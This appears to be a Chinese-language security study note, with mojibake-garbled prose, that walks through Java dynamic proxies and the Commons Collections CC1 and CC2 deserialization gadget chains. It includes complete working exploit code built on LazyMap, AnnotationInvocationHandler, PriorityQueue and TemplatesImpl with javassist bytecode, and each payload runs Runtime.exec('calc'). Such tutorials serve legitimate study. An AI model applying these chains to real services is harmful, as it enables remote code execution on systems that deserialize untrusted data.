1.javaä¸­ä»£ç†ç±»çš„ä½œç”¨æ˜¯:è°ƒç”¨ä¸å¯ä»¥ç›´æ¥è¢«å®ä¾‹åŒ–çš„æ¥å£æ–¹æ³•ã€‚2.åŠ¨æ€ä»£ç†å¯ä»¥ç›´æ¥â€åˆ›å»ºâ€æŸä¸ªæ¥å£çš„å®ä¾‹ï¼Œå¯¹å…¶æ–¹æ³•è¿›è¡Œè°ƒç”¨.3.è°ƒç”¨æŸä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä»£ç†ç±»çš„invokeæ–¹æ³•. å…ˆå®šä¹‰ä¸€ä¸ªæ¥å£ã€‚å®ƒæœ‰ä¸€ä¸ªhelloworldæ–¹æ³•ã€‚ 12345package top.bycsec;public interface Hello &#123; void helloworld(String name);&#125; æ¥ä¸‹æ¥è°ƒç”¨è¿™ä¸ªexpã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªhandler.å®ƒå®ç°äº†InvocationHandlerè¿™ä¸ªæ¥å£ã€‚åŒæ—¶éœ€è¦é‡å†™invokeæ–¹æ³•ã€‚æ­¤å¤„æˆ‘ä»¬è®©ä»–åœ¨æ–¹æ³•åä¸ºhelloworldæ—¶è¾“å‡ºè‡ªå®šä¹‰å†…å®¹ç„¶åå®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡hello.ä»–éœ€è¦ClassLoader,è¦ä»£ç†çš„æ¥å£æ•°ç»„ä»¥åŠè°ƒç”¨æ¥å£æ—¶è§¦å‘çš„å¯¹åº”æ–¹æ³•ä½œä¸ºæ„é€ å‚æ•°ã€‚exp 1234567891011121314151617181920212223package top.bycsec;import java.lang.reflect.Proxy;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class exp &#123; public static void main(String[] args) throws Exception &#123; InvocationHandler handler = new InvocationHandler()&#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (method.getName().equals(\"helloworld\")) &#123; System.out.println(\"Hello, \" + args[0]); &#125; return null; &#125; &#125;; Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Hello.class&#125;,handler); hello.helloworld(\"byc_404\"); &#125;&#125; è¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨æ¥å£çš„helloworldæ—¶ã€‚å°±ä¼šè§¦å‘invokeæ–¹æ³•é‡Œçš„å†…å®¹ã€‚è¾“å‡ºHello, byc_404 æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹cc1é“¾å­çš„å†…å®¹ã€‚é¦–å…ˆä»æ‰§è¡Œå‘½ä»¤çš„åå°„gadgetå¼€å§‹ã€‚è¿™é‡Œæˆ‘ç¡®è®¤è¿‡ä¸€éï¼Œåº”è¯¥æ˜¯ç¬¬ä¸€éƒ¨åˆ†è·ŸCC5æ—¶å°±çœ‹è¿‡äº†ã€‚ç»“æœç°åœ¨å·²ç»å¿˜å…‰äº†â€¦â€¦æ‰€ä»¥å†çœ‹ä¸€éã€‚ é¦–å…ˆæ˜¯commonscollectionsè¿™ä¸ªåŒ…é‡ŒTrandsformerè¿™ä¸ªæ¥å£ 12345package org.apache.commons.collections;public interface Transformer &#123; Object transform(Object var1);&#125; å®ƒå®ç°äº†ç±»å‹è½¬æ¢çš„åŠŸèƒ½ã€‚å…¶ä¸­å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»ä¸»è¦æœ‰ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åé¢æ„é€ payloadè¦ç”¨åˆ°çš„. InvokerTransformerConstantTransformerChainedTransformerä»–ä»¬éƒ½å®ç°äº† Transformer ä»¥åŠ Serializableæ¥å£ã€‚ çœ‹ä¸‹ä»–ä»¬çš„transformæ–¹æ³•InvokeTransformer 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); &#125; &#125;&#125; ä¸€ä¸ªéå¸¸å…¸å‹çš„åå°„è°ƒç”¨æ–¹æ³•çš„åŠŸèƒ½ ConstantTransformer 1234567public Object transform(Object input) &#123; return this.iConstant;&#125;public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn;&#125; è¿”å›æŸå‚æ•°ã€‚å¦‚æœå»çœ‹äº†å®ƒçš„æ„é€ æ–¹æ³•å°±ä¼šå‘ç°å…¶å®transformæ˜¯ä¸€ä¸ªåŸå°ä¸åŠ¨è¿”å›çš„åŠŸèƒ½ã€‚ ChainedTransformer 1234567public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; æ‰§è¡Œä¸€ä¸ªforå¾ªç¯è¿›è¡Œå¾ªç¯è°ƒç”¨ã€‚å¯¹æ¯ä¸ªä¼ å…¥çš„transformeréƒ½è°ƒç”¨å…¶transformæ–¹æ³•å¹¶ä½œä¸ºä¸‹ä¸€æ¬¡çš„å‚æ•°ã€‚ å¦‚æœç›´æ¥æŠ½è±¡ç‚¹ç†è§£ï¼Œå¤§æ¦‚æ˜¯èƒ½ç†è§£ä¸‹é¢çš„expçš„ 123456789101112131415161718192021package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.*;public class cc1 &#123; public static void main(String[] args)&#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); chain.transform(123); &#125;&#125; æ•´ä½“ä¸Šæ˜¯ä¸€ä¸ªChainedTransformerå¾ªç¯è°ƒç”¨transformçš„è¿‡ç¨‹ã€‚å…¶ä¸­ConstantTransformerè·å–åˆ°Runtimeçš„ç±»ï¼Œåé¢å¾ªç¯è°ƒç”¨äº†ä¸‰ä¸ªinvokeè·å–æ–¹æ³•æ‰§è¡Œã€‚ ä¸‹é¢ç»†èŠ‚åŒ–çš„è§£é‡Šä¸‹.æ¯•ç«Ÿccé“¾å­æ‰€æœ‰å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†éƒ½æ˜¯è¿™æ¡é“¾(æ²¡è®°é”™çš„è¯) å…ˆè¯´InvokeTransformerçš„transformæ–¹æ³•ã€‚ä¸Šé¢æºç é‡Œè¯´æ˜äº†å®ƒä¸»è¦æ˜¯ä¸€ä¸ªåå°„çš„è¿‡ç¨‹ã€‚å…¶æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚ 1234try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); æœ€å¤§çš„å¥½å¤„å°±æ˜¯è¿™é‡Œæ‰€æœ‰åå°„å‚æ•°éƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å…¶å®è¿™é‡Œå°±èƒ½rce. 123Runtime runtime = Runtime.getRuntime();Transformer invoketransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);invoketransformer.transform(runtime); åªä¸è¿‡æ˜¾ç„¶æˆ‘ä»¬æ²¡æœ‰ç›´æ¥ä¼ å…¥ä¸€ä¸ªRuntime.getRuntime()è¿™æ ·ä¸€ä¸ªå®ä¾‹çš„å¯èƒ½ã€‚æ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸€ä¸‹å…¶ä»–çš„ç±»ä½œè¾…åŠ©ã€‚ æ¯”å¦‚è¯´ä¸Šé¢æåˆ°çš„ConstantTransformer.å…¶transformæ–¹æ³•ä¼šè¿”å›è‡ªèº«ã€‚æ‰€ä»¥è¯´å¯ä»¥ 123Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);Transformer invoketransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);invoketransformer.transform(constantTransformer); å†åŠ ä¸ŠChainedTransformä¼šè°ƒç”¨å…¶è¾“å…¥çš„transformè¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥æ¥åˆ°ccåå°„expçš„é›å½¢ 123456ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;)&#125;);chain.transform(123); æ­¤æ—¶å·²ä¸å†éœ€è¦è¾“å…¥å˜é‡ä¸ºå¯¹è±¡ï¼Œè€Œæ˜¯å¯ä»¥ä¸ºä»»æ„å€¼(æ­¤å¤„ä¸º123)ã€‚ åªä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ›¾ç»è¯´è¿‡ javaååºåˆ—æŸç±»æ—¶,è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ æ­¤å¤„Runtime.getRuntime()è¿˜æ˜¯è¿”å›äº†runtimeå¯¹è±¡ï¼Œå®ƒä¸æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å³ååºåˆ—åŒ–æ—¶ä¸Šè¿°expä¼šæŠ¥é”™æŠ›å‡ºNotSerializableExceptionã€‚ å½“ç„¶è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¸å…è®¸ç›´æ¥è·å–çš„è¯ï¼Œç›´æ¥åŠ¨æ€è°ƒç”¨å°±å¥½äº†ã€‚ä¹Ÿå°±æ˜¯ç»§ç»­ç”¨åå°„è·å–Runtime.æ‰€ä»¥æ‰æœ‰äº†æœ€å®Œæ•´çš„expä¸­ 1234567891011ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;);chain.transform(123); ç¬¬ä¸€æ­¥åå°„ä½¿ç”¨getMethodè·å–getRuntimeè¿™ä¸ªæ–¹æ³•å¯¹è±¡ã€‚å†invokeè·å–getRuntimeçš„æ‰§è¡Œç»“æœã€‚æœ€åç›´æ¥åå°„æ‰§è¡Œexec calc.æˆ–è€…ä¼ å­—ç¬¦ä¸²æ•°ç»„æ‰§è¡Œç‰¹æ®Šå‘½ä»¤å¼¹shell. åˆ°è¿™ä¸€æ­¥ä¸ºæ­¢è¾¾æˆäº†ï¼š ååºåˆ—åŒ–æ—¶æ‰§è¡Œtransformæ–¹æ³•å³å¯rce.ä¸‹é¢å°±æ˜¯æ‰¾å¯ç”¨ç±»é“¾å­äº†ã€‚å› ä¸ºä¸å¯èƒ½ç›´æ¥å°±åœ¨readObjecté‡Œè°ƒç”¨transformå§ã€‚ ä¸‹é¢æ˜¯cc1ä¸­é“¾å­çš„å¼€å§‹ã€‚org.apache.commons.collections.map.LazyMap å®ƒå®ç°äº†Serializableæ¥å£å¹¶å­˜åœ¨readObjectæ–¹æ³•ã€‚ LazyMapçš„getæ–¹æ³• 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125;&#125; this.factory.transform(key)å°±æ˜¯ä¸€ä¸ªè°ƒç”¨äº†transformçš„ä¾‹å­ã€‚é‚£ä¹ˆåªè¦factoryå¯æ§å°±èƒ½è°ƒç”¨ä¸Šé¢çš„åå°„rceäº†ã€‚ çœ‹ä¸‹æ„é€ æ–¹æ³•ã€‚è™½ç„¶åªè¦å®ä¾‹åŒ–çš„è¯å°±èƒ½æ§åˆ¶factoryäº†ã€‚ä½†æ˜¯è¿™ä¸æ˜¯ä¸€ä¸ªpublicçš„æ„é€ æ–¹æ³•ï¼Œåœ¨javaä¸­æƒ³è¦è·å–åˆ°è¿™ä¸ªæ„é€ æ–¹æ³•è¿˜æ˜¯å¾—ç”¨åå°„ã€‚æ­¤æ—¶çš„expå·²ç»å¯ä»¥å†™æˆ 123456789101112131415161718public static void main(String[] args) throws Exception &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); HashMap innermap = new HashMap(); Constructor constructor = Class.forName(\"org.apache.commons.collections.map.LazyMap\").getDeclaredConstructor(Map.class, Transformer.class); constructor.setAccessible(true); LazyMap map = (LazyMap)constructor.newInstance(innermap,chain); map.get(123); &#125; æ‰€ä»¥ï¼Œæœ€åä¹Ÿæ˜¯æœ€éš¾çš„ä¸€ç‚¹å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨getå¹¶ä¼ é€’ä»»æ„å€¼çš„åœ°æ–¹ï¼Œæ¥è°ƒç”¨æˆ‘ä»¬lazymapçš„getæ–¹æ³•ã€‚è¿™ä¹Ÿå°±æ˜¯ä½œè€…çš„å¼ºå¤§ä¹‹å¤„ã€‚ jdk1.7ç‰ˆæœ¬ä¸‹æ‰¾åˆ°çš„æ˜¯sun.reflect.annotation.AnnotationInvocationHandleræ³¨æ„ä½ ç›´æ¥å¯¼å…¥æ˜¯å¯¼ä¸äº†è¿™ä¸ªç±»çš„ã€‚å¯ä»¥åœ¨jreçš„rt.jar ä¸­æ‰¾åˆ°è¿™ä¸ª\\sun\\reflect\\annotation\\AnnotationInvocationHandler.class 12345678910111213private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); ...... æ³¨æ„è¿™é‡ŒreadObjectåˆè°ƒç”¨äº†this.memberValuesçš„entrySetæ–¹æ³•ã€‚å¦‚æœè¿™é‡Œçš„memberValuesæ˜¯ä¸ªä»£ç†ç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨memberValueså¯¹åº”handlerçš„invokeæ–¹æ³•ï¼Œcc1ä¸­å°†handlerè®¾ç½®ä¸ºAnnotationInvocationHandlerï¼ˆå…¶å®ç°äº†InvocationHandlerï¼Œæ‰€ä»¥å¯ä»¥è¢«è®¾ç½®ä¸ºä»£ç†ç±»çš„handlerï¼‰ è¿™ä¹Ÿå°±æ˜¯java çš„åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚è°ƒç”¨entrysetè¿™ä¸ªæ–¹æ³•å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ä»£ç†çš„invoke.invokeé‡Œåˆè°ƒç”¨äº†memberValuesçš„get.é‚£ä¹ˆåªè¦ä»¤memberValuesä¸ºæˆ‘ä»¬æ„é€ å¥½çš„Lazymapå¯¹è±¡å³å¯ final exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bag.HashBag;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.LazyMap;import sun.reflect.annotation.AnnotationParser;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.IdentityHashMap;import java.util.Map;public class cc1 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Constructor constructor = Class.forName(\"org.apache.commons.collections.map.LazyMap\").getDeclaredConstructor(Map.class, Transformer.class); constructor.setAccessible(true); HashMap hashMap = new HashMap&lt;String, String&gt;(); Object lazyMap = constructor.newInstance(hashMap, chainedTransformer); constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap); Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), new Class[]&#123;Map.class&#125;, invo); constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Deprecated.class, proxy); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"out.bin\")); oos.writeObject(obj); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"out.bin\")); ois.readObject(); ois.close(); &#125;&#125; CommonCollections2 é¦–å…ˆæ³¨æ„æ˜¯CommonsCollections4çš„ä¾èµ– èµ·ç‚¹æ˜¯java.util.PriorityQueue#readObject 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify();&#125;private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);&#125;private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);&#125;private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x;&#125; è¿™é‡Œqueueå¯æ§ã€‚ç„¶åä¸€æ¡é“¾èµ°å‘heapify =&gt; siftDown =&gt; siftDownUsingComparator =&gt; comparator.compare è¿™é‡Œå°±å¯ä»¥å¼€å¯æ–°çš„gadgetäº†ã€‚æ¯”å¦‚cc2é“¾å­ä¸­ä½¿ç”¨çš„æ˜¯org.apache.commons.collections4.comparators.TransformingComparator çš„åŒåcompareæ–¹æ³•ã€‚ 12345public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);&#125; transformæ–¹æ³•çš„ä½œç”¨è‡ªç„¶æ˜¯ä¹‹å‰çš„ä¸€å¥—åå°„ç»„åˆæ‹³è¿›è¡Œrceäº†ã€‚æ‰€ä»¥éœ€è¦transformerå¯æ§ã€‚è€Œä»æ„é€ æ–¹æ³•å»çœ‹çš„è¯ä¼šå‘ç°ä¹Ÿæ˜¯å¯æ§çš„ã€‚ è¿™é‡Œå°±å¯ä»¥å†™ä¸€ä¸ªexp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package top.bycsec;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;public class cc2 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; è¿™é‡Œé¦–å…ˆæ³¨æ„queueåŠ äº†ä¸¤ä¸ªå…ƒç´ ï¼Œè¿™æ˜¯å› ä¸ºsizeä¸å¤§äº1çš„è¯æ— æ³•è¿›å…¥siftDownæ–¹æ³•ã€‚ç„¶åqueue.addè¿™æ®µä»£ç ä¸èƒ½æ”¾åˆ°åå°„å®ä¾‹åŒ–comparatorçš„åé¢ã€‚å› ä¸ºä»£ç æ®µä¸­å¦‚æœcomparatorä¸ä¸ºnullä¼šæ”¾ä¸è¿›å»å…ƒç´ ã€‚ ç„¶åå…¶å®ä¸Šé¢è¿™ä¸ªexpå¹¶ä¸æ˜¯ysoserial CC2çš„expé“¾å­ã€‚å®ƒä½¿ç”¨çš„æ˜¯javassist + TemplatesImplã€‚é¦–å…ˆç®€å•è¯´æ˜ä¸‹javassist,å®ƒæä¾›äº†ä¿®æ”¹å­—èŠ‚ç çš„åŠŸèƒ½ã€‚ æ¯”å¦‚æˆ‘ä»¬æ‰‹åŠ¨ç”Ÿæˆä¸€ä¸ªbyc404.class 1234567891011121314151617181920212223242526package top.bycsec;import javassist.*;public class cc2 &#123; public static void createPseson() throws Exception &#123; ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"System.out.println(\\\"evil code\\\");\"; // åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥ä»£ç  cc.makeClassInitializer().insertBefore(cmd); String ClassName = \"byc404\"; cc.setName(ClassName); // å†™å…¥.class æ–‡ä»¶ cc.writeFile(); &#125; public static void main(String[] args) &#123; try &#123; createPseson(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; åƒè¿™æ ·èƒ½å¤Ÿç›´æ¥æ§åˆ¶staticæ–¹æ³•çš„è¯,é‚£ä¹ˆå®ƒåœ¨å®ä¾‹åŒ–æ—¶å°±ä¼šè¢«ç›´æ¥æ‰§è¡Œã€‚ æ¥ä¸‹æ¥çœ‹çœ‹å®ƒçœŸæ­£çš„æ ¸å¿ƒTemplatesImplçš„ä½¿ç”¨ 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; è·Ÿè¿›getTransletInstance 12345678910private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); è¿™é‡ŒdefineTransletClasses()å¯ä»¥è¿˜åŸbytecodeä¸ºclass.åé¢çš„newInstance()åˆ™å¯ä»¥å®ä¾‹åŒ–è¿™ä¸ªclass.åœ¨è¿™ä¸ªå®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­staticæ–¹æ³•å°±ä¼šæ‰§è¡Œã€‚æ‰€ä»¥è¾¾æˆäº†ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ å†ç¨å¾®å¤šå›é¡¾ä¸‹å‰é¢æˆ‘ä»¬è¾¾åˆ°çš„è¿›åº¦ï¼Œå°±æ˜¯æˆ‘ä»¬å·²ç»å¯ä»¥ä»»æ„è°ƒç”¨transformäº†,åªéœ€ä¸€ä¸ªå¯æ§å¯¹è±¡ã€‚é‚£ä¹ˆè¿™é‡Œå†ç”¨ä¹‹å‰ç»å¸¸ç”¨åˆ°çš„InvokerTransformer.transformåå°„æ¥è°ƒç”¨TemplatesImpl.newtransformer æœ€ç»ˆexp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package top.bycsec;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class cc2 &#123; public static void main(String[] args) throws Exception &#123; Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"byc404\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; è¿™ä¸ªexpå‡ ä¸ªç»†èŠ‚è¿˜æ˜¯å€¼å¾—è¯´æ˜ä¸€ä¸‹çš„ã€‚ä¸è¿‡æˆ‘è¿˜æ˜¯å·æ‡’ä¸‹ä¸æ·±å…¥äº†ï¼Œå°±å½“åšä¸€äº›æ³¨æ„äº‹é¡¹ç®€å•è¯´æ˜ä¸‹ã€‚ 